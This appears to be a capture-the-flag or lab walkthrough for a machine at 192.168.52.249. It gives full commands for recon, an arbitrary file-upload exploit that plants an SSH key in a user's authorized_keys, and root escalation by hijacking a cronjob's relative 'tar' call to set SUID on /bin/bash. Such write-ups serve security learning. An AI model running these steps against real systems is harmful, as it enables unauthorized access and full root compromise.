# Penetration Testing Report: 192.168.52.249

## 1. Reconnaissance & Enumeration

### Nmap Scan Results
An initial full TCP port scan (-p-) was conducted with default scripts (-sC) and version detection (-sV).

PORT      STATE  SERVICE        VERSION
21/tcp    open   ftp            vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   ssh            OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open   http           Werkzeug httpd 2.2.3 (Python 3.9.13)
|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
|_http-title: 404 Not Found
40080/tcp open   http           Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.53 (Fedora)
|_http-title: My test page
Service Info: OS: Unix

### Web Enumeration: Port 40080 (Apache)
Note: This service was determined to be a rabbit hole.

* /images -> Contains a Mozilla image.
* /styles -> Contains a standard CSS page.
* /LICENSE -> Contains license details.
* Conclusion: No actionable vectors found here.

### Web Enumeration: Port 33414 (Werkzeug / Python REST API)
Directory brute-forcing revealed a Python-based File Server REST API (v2.5) authored by Alfredo Moroder.

* /info: Confirms the API details.
  - 0: "Python File Server REST API v2.5"
  - 1: "Author: Alfredo Moroder"
  - 2: "GET /help = List of the commands"
* /help: Lists available API endpoints:
  - GET /info : General Info
  - 1 "GET /help : This listing"
  - 2 "GET /file-list?dir=/tmp : List of the files"
  - 3 "POST /file-upload : Upload files"

#### Directory Traversal via /file-list
By querying directories, system accounts and temporary file behaviors were mapped:

* Query: /file-list?dir=/home
  - Output: 0 "alfredo" (Identified target local user)
* Query: /file-list?dir=/tmp
  - Output:
    0 "flask.tar.gz"
    1 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-httpd.service-mjMDzW"
    2 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-systemd-logind.service-ve1fMD"
    3 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-ModemManager.service-P127VQ"
    4 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-chronyd.service-hs7WPF"
    5 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-dbus-broker.service-XE62Fp"
    6 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-systemd-resolved.service-O6dxPH"
    7 "systemd-private-0c7fad6e129b45c39aa0762612d7b03d-systemd-oomd.service-tasz5j"

---

## 2. Exploitation: Initial Access

The POST /file-upload endpoint allowed for arbitrary file writes. By targeting the user directory for alfredo, an SSH public key was injected to establish access.

### Step 1: Upload SSH Public Key
Using curl, the local attacker public key (id_rsa.txt) was uploaded directly into Alfredo's .ssh directory as authorized_keys.

curl -X POST http://192.168.52.249:33414/file-upload \
  -H "Content-Type: multipart/form-data" \
  -F "file=@/home/kali/.ssh/id_rsa.txt" \
  -F "filename=/home/alfredo/.ssh/authorized_keys"

### Step 2: Establish SSH Session
With the key successfully written, an interactive shell was opened via SSH on port 25022:

ssh alfredo@192.168.52.249 -p 25022

---

## 3. Privilege Escalation

### Local Enumeration
Running linpeas.sh on the target machine flagged an unprivileged, exploitable cronjob executing with root permissions.

### Vulnerable Cronjob Analysis
The cronjob periodically runs a backup command utilizing tar inside the application folder:

# Cronjob execution signature observed:
Runs tar in the restapi folder.

### Path Hijacking Execution
Because the cron job runs inside a directory owned/writable by alfredo and invokes tar without specifying its absolute path (or handles wildcard expansions poorly), the path execution flow can be hijacked.

A malicious executable script named tar was injected into the directory to assign the SUID bit to /bin/bash when executed by root:

# Create the script to modify bash permissions
echo '#!/bin/bash' > tar
echo "chmod +s /bin/bash" >> tar
chmod +x tar

# Wait for the cronjob cycle to run as root...

# Drop into a root shell
/bin/bash -p

---

## 4. Key Takeaways

| Technique | Description |
| :--- | :--- |
| **Arbitrary File Upload** | Leveraging a vulnerable REST API endpoint (`/file-upload`) to write files anywhere the application process has permissions. |
| **SSH Key Injection** | Writing a public key directly to a user's `authorized_keys` file to bypass standard password authentication. |
| **Automated Enumeration** | Utilizing tools like `linpeas` to efficiently spot weak file permissions and misconfigured cronjobs. |
| **Cronjob Hijacking** | Exploiting relative binary paths or wildcard behaviors in root cronjobs via custom script creation (`tar`) to achieve arbitrary code execution as root. |
